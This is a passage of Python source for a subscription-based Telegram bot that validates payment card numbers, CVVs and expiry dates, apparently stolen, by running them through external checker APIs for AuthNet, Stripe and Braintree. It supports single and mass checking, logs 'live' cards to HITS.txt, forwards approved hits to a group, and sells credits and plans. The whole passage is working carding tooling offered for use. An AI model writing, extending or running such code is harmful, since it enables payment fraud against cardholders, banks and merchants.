            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'AuthNet [49$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'AuthNet [49$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'AuthNet [49$]'
        }

@bot.message_handler(commands=['at'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.at'))
def handle_at(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from input
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sq CC|MM|YYYY|CVV or .sq CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>AuthNet [49$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_at_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_ah_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(AH_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Auth Net [5$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Auth Net [5$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Auth Net [5$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Auth Net [5$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Auth Net [5$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Auth Net [5$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Auth Net [5$]'
        }


# Handle both /sq and .sq
@bot.message_handler(commands=['ah'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ah'))
def handle_ah(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from input
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ah CC|MM|YYYY|CVV or .sq CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  # remove ".sq "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>AuthNet [5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_ah_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /msq and .msq
@bot.message_handler(commands=['mah'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mah'))
def handle_mah(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_ah_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'AuthNet [5$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_sf_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(SF_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [10$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [10$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [10$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [10$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [10$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [10$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe [10$]'
        }

# Handle both /cc and .cc
@bot.message_handler(commands=['sf'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sf'))
def handle_sf(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /sf CC|MM|YYYY|CVV or .cc CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe [10$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_sf_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /sf] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['msf'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msf'))
def handle_msf(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sf_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe [10$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_br_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree charge [1$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree charge [1$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree charge [1$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree charge [1$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree charge [1$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree charge [1$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(BR_API_URL.format(formatted_cc), headers=headers, timeout=180)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree charge [1$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree charge [1$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree charge [1$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree charge [1$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree charge [1$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree charge [1$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree charge [1$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree charge [1$]'
        }

@bot.message_handler(commands=['br'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.br'))
def handle_br(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/b3' or '.b3' without arguments)
        if (message.text.startswith('/br') and len(message.text.split()) == 1) or \
           (message.text.startswith('.br') and len(message.text.strip()) == 3):
            
